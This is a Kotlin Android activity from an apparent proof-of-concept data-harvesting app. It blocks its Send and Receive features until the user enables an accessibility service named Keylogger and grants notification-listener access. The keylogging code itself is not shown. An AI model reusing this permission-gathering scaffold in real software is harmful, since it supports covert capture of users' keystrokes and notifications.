package com.synergia.datapoc

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.DialogInterface
import android.content.Intent
import android.content.pm.ServiceInfo
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.provider.Settings
import android.view.View
import android.view.accessibility.AccessibilityManager
import com.facebook.stetho.Stetho
import kotlinx.android.synthetic.main.activity_home.*
import org.jetbrains.anko.startActivity

class HomeActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_home)
        btnReceive.setOnClickListener {
            startActivity<MainActivity>()
        }
        btnSend.setOnClickListener {
            startActivity<SendDetailsActivity>()
        }
    }

    override fun onResume() {
        super.onResume()
        if(isAccessibilityServiceEnabled(this, Keylogger::class.java)){
            if (Settings.Secure.getString(this.contentResolver, "enabled_notification_listeners").contains(applicationContext.packageName)) {
                btnReceive.visibility=View.VISIBLE
                btnSend.visibility=View.VISIBLE
            }else{
                AlertDialogHelper.showDialog(
                    this,
                    "Enable Special Access",
                    "Need Notification Access",
                    "Ok",
                    null,
                    DialogInterface.OnClickListener { dialog, _ ->
                        //service is not enabled try to enabled by calling...
                        startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
                        dialog.cancel()
                        this.finish()
                    }
                )
            }
        }else{
            AlertDialogHelper.showDialog(
                this,
                "Enable Accessibility",
                "Need Accessibility permission",
                "Ok",
                null,
                DialogInterface.OnClickListener { dialog, _ ->
                    //service is not enabled try to enabled by calling...
                    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    startActivityForResult(intent, 0)
                    dialog.cancel()
                    finish()
                }
            )
        }
    }


    fun isAccessibilityServiceEnabled(context: Context, service: Class<out AccessibilityService?>): Boolean {
        val am =
            context.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices =
            am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
        for (enabledService in enabledServices) {
            val enabledServiceInfo: ServiceInfo = enabledService.resolveInfo.serviceInfo
            if (enabledServiceInfo.packageName == context.packageName && enabledServiceInfo.name == service.name) return true
        }
        return false
    }
}